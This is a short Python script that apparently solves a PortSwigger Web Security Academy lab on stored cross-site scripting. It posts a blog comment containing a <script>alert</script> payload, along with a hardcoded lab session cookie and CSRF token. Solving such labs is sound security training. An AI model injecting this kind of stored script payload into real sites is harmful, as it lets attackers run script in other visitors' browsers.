# https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded

import requests
requests.packages.urllib3.disable_warnings()

url = "https://acdb1f5d1fa04b1380c136c1008200e0.web-security-academy.net/post/comment"
verify = False
proxy = "127.0.0.1:8080"
proxies = {"http://": proxy, "https://": proxy}
cookies = {"session": "pcPw9o21bABNtJR1DJiFQ69ygICaxNLZ"}
payload="<script>alert('test');</script>"
data = {"csrf": "3FdQWhj7eIDhiLqxxHxER4Ssu6ctkaUO",
        "postId": "5",
        "comment": payload,
        "name": "test",
        "email": "test@email.com",
        "website": "http://test.com"}

requests.post(url, verify=verify, cookies=cookies, proxies=proxies, data=data)
